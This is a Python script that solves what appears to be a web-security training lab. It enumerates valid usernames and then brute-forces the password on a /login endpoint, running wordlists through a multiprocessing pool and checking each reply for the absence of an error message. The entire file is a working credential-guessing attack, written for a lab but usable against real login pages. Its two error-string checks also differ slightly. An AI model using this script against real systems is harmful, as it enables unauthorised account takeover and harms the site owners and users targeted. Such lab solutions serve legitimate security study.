import requests
from lib import generate_parser, SESSION
import time
from multiprocessing import Pool
from itertools import repeat

USERNAME = ""
PASSWORD = ""


def enumerate_username(username: str) -> str | None:
    print(f"[~] Trying Username: {username}", end="\r", flush=True)

    try:
        response = SESSION.post(
            url=lab_url + "/login",
            data={"username": username, "password": "test"},
        )

        if "Invalid username or password." not in response.text:
            print(f"\n[+] Username Found: {username}")
            return username

    except requests.RequestException as error:
        print("[-] Error", error)

    return None


def enumerate_password(args) -> str | None:
    (username, password) = args

    print(f"[~] Trying Password: {password}", end="\r", flush=True)

    try:
        response = SESSION.post(
            url=lab_url + "/login", data={"username": username, "password": password}
        )

        if "Invalid username or password " not in response.text:
            print(f"\n[+] Password Found: {password}")
            return password

    except requests.RequestException as error:
        print("[-] Error", error)

    return None


if __name__ == "__main__":
    start_time = time.perf_counter()

    args = generate_parser()

    lab_url = args.lab_url.strip("/")

    print("[!] Enumerating Username")

    with open("../payloads/authentication/usernames.txt", "r") as usernames:
        usernames_array = [username.strip() for username in usernames.readlines()]

        with Pool(10) as p:
            for result in p.imap(enumerate_username, usernames_array):
                if result is not None:
                    USERNAME = result
                    p.terminate()
                    break

    print("[!] Enumerating Password")

    with open("../payloads/authentication/passwords.txt", "r") as passwords:
        passwords_array = [password.strip() for password in passwords.readlines()]
        args_array = zip(repeat(USERNAME), passwords_array)

        with Pool(10) as p:
            for result in p.imap(enumerate_password, args_array):
                if result is not None:
                    PASSWORD = result
                    p.terminate()
                    break

    end_time = time.perf_counter()
    print(f"[+] Total Time Taken: {end_time - start_time}")

    print("[!] Username and Password found successfully")
    print(f"[+] Username: {USERNAME}")
    print(f"[+] Password: {PASSWORD}")
    print("[!] Lab is solved succesfully!!!")
